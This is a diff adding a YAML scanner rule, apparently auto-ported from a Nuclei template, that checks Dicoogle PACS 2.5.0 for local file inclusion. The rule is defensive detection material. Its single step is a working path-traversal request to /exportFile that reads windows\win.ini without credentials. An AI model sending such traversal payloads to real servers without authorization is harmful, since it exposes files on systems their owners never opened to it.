@@ -1,0 +1,32 @@
+schema_version: 1
+id: "cortex.community:dicoogle-pacs-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Dicoogle PACS 2.5.0 - Local File Inclusion"
+  description: "Dicoogle PACS 2.5.0 is vulnerable to local file inclusion. This allows an attacker to read arbitrary files that the web user has access to. Admin credentials aren't required. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://www.exploit-db.com/exploits/45007"
+    - "https://cxsecurity.com/issue/WLB-2018070131"
+    - "http://www.dicoogle.com/home"
+  cwes: [22]
+  tags: ["edb", "windows", "lfi", "dicoogle", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "bit app support" } }
+      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "fonts" } }
+      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "extensions" } }
